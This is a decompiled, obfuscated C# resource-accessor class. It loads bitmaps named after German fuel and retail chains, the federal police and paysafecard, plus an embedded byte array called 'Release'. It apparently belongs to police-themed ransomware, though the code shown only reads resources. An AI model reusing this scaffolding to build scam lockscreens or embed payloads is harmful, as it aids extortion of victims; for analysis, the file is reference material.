using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns5;

[HideModuleName]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[StandardModule]
[DebuggerNonUserCode]
[CompilerGenerated]
internal sealed class Class18
{
	private static ResourceManager resourceManager_0;

	private static CultureInfo cultureInfo_0;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			if (object.ReferenceEquals(resourceManager_0, null))
			{
				ResourceManager resourceManager = (resourceManager_0 = new ResourceManager("Output.Resources", typeof(Class18).Assembly));
			}
			return resourceManager_0;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return cultureInfo_0;
		}
		set
		{
			cultureInfo_0 = value;
		}
	}

	internal static Bitmap AgipLogo
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("AgipLogo", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap aral
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("aral", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap banananeu
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("banananeu", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap bundespolizei
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("bundespolizei", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap esso
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("esso", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap nettodiscount
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("nettodiscount", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap omv
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("omv", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static Bitmap paysafecard
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("paysafecard", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}

	internal static byte[] Release
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Release", cultureInfo_0));
			return (byte[])objectValue;
		}
	}

	internal static Bitmap rossmann
	{
		get
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("rossmann", cultureInfo_0));
			return (Bitmap)objectValue;
		}
	}
}
